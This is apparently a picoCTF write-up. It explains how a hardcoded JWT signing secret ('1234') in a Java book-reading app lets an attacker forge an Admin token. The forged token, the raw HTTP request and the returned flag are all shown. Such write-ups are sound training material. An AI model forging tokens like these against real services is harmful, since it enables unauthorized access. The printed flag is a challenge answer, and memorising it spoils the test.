# Java Code Analysis!?!
BookShelf Pico, my premium online book-reading service.
I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book! (300 Points)
Here are the credentials to get you started:
- Username: "user"
- Password: "user"

## Data
bookshelf-pico.zip

## Solution
On the website we see three different eBooks. One of them, the 'Flag' book, is only accessable for the admin. So to get the flag we to raise up our priviledges.

According to the hints there is something going on with the JWT (JSON Web Tokens). Those tokens are a standard for web authentification. If you login to a website, the server generates a token for the web response. If the client connects the server with a valid token, he will be autehnticated by the server.

If we login to the website and analyse the traffic with zap, we find the following token in the response to the login POST from the client:
```
{"type":"SUCCESS","payload":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4MDU0MDYwOSwiaWF0IjoxNjc5OTM1ODA5LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.kOni4aqUFqgp4myBdnwUJqTvdmV4vNQaFC7oKqCfR9o"}
```

The token is structured in three parts, sperated by a dot: HEADER (ALGORITHM & TOKEN TYPE), PAYLOAD (DATA) and VERIFY SIGNATURE. At https://jwt.io/#debugger-io the can analyze the token. The payload is the most interesting for us at this part:
```
{
  "role": "Free",
  "iss": "bookshelf",
  "exp": 1680540609,
  "iat": 1679935809,
  "userId": 1,
  "email": "user"
}
```

This payload could be edited and we can generate a new token. But we also need a keyword, which is given by the server for the verify signature. Maybe we can find it in the source code.

In the file 'JavaCodeAnalysis/bookshelf-pico/src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java' we find indeed an unsecure function:
```java
    private String generateRandomString(int len) {
        // not so random
        return "1234";
    }
```

The code tries to generate the secret with a file 'server\_secret.txt' and if this file is not given, it will use the function shown above:
```java
    String getServerSecret() {
        try {
            String secret = new String(FileOperation.readFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME), Charset.defaultCharset());
            logger.info("Server secret successfully read from the filesystem. Using the same for this runtime.");
            return secret;
        }catch (IOException e){
            logger.info(SERVER_SECRET_FILENAME+" file doesn't exists or something went wrong in reading that file. Generating a new secret for the server.");
            String newSecret = generateRandomString(32);
            try {
                FileOperation.writeFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME, newSecret.getBytes());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            logger.info("Newly generated secret is now written to the filesystem for persistence.");
            return newSecret;
        }
    }
```

So probably this is our key to verify the JWT signature.

In 'JavaCodeAnalysis/bookshelf-pico/src/main/java/io/github/nandandesai/pico/security/JwtService.java' we can find more information about the structure of the token, but there is no difference to the token we already decoded.

The file 'JavaCodeAnalysis/bookshelf-pico/src/main/java/io/github/nandandesai/pico/configs/BookShelfConfig.java' shows some information about the user configuration. The important part is the creation of the admin user:
```java
                User admin = new User();
                admin.setProfilePicName("default-avatar.png")
                        .setRole(AdminRole)
                        .setLastLogin(LocalDateTime.now())
                        .setFullName("Admin")
                        .setEmail("admin")
                        .setPassword(passwordEncoder.encode("<redacted>"));
                userRepository.save(admin);
```

So with this informations we can create a new token:
```
Header
{
  "typ": "JWT",
  "alg": "HS256"
}

Payload
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1680538930,
  "iat": 1679934130,
  "userId": 2,
  "email": "admin"
}

Signature
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  1234
)
```
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE2ODA1Mzg5MzAsImlhdCI6MTY3OTkzNDEzMCwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.NXhqBffCO2UP3ImWeCg7UJR5c0UHRH_SFY9bzTptmPY
```

Via zap we can use this token to edit a GET request to the website. It uses our old token, so we can just replace it:
```
GET http://saturn.picoctf.net:51082/base/books HTTP/1.1
Host: saturn.picoctf.net:51082
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE2ODA1Mzg5MzAsImlhdCI6MTY3OTkzNDEzMCwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.NXhqBffCO2UP3ImWeCg7UJR5c0UHRH_SFY9bzTptmPY
Connection: keep-alive
Referer: http://saturn.picoctf.net:51082/
Content-Length: 0
```

Our responce looks good. We get an success and a list of the books
```
{"type":"SUCCESS","payload":[{"id":3,"title":"Little Brother","desc":"Little Brother is a novel by Cory Doctorow, published by Tor Books. It was released on April 29, 2008. The novel is about four teenagers in San Francisco who, in the aftermath of a terrorist attack on the San Franciscoâ€“Oakland Bay Bridge and BART system, defend themselves against the Department of Homeland Security's attacks on the Bill of Rights.","role":"Free"},{"id":4,"title":"The Future of the Internet and How to Stop It","desc":"The Future of the Internet and How to Stop It is a book published in 2008 by Yale University Press and authored by Jonathan Zittrain. The book discusses several legal issues regarding the Internet.","role":"Premium"},{"id":5,"title":"Flag","desc":"You need to have Admin role to access this special book!","role":"Admin"}]}
```

To access the 'Flag' book we have to call the URL `http://saturn.picoctf.net:51082/base/books/pdf/5`. We can see this also in zap if we access a book for that we have the permissions. So if we access the URL with our admin token, we get a valid response with the PDF in the body. If we scroll over the body in zap we can find our flag:
```
>>
stream
BT
/F1 20 Tf
1 0 0 1 50 752 Tm
12 TL
(Great job! Here's your flag:)'
()'
()'
(picoCTF{w34k_jwt_n0t_g00d_602ce414})'
ET
endstream
endobj
8 0 obj
119
endobj
3 0 obj
<<
```
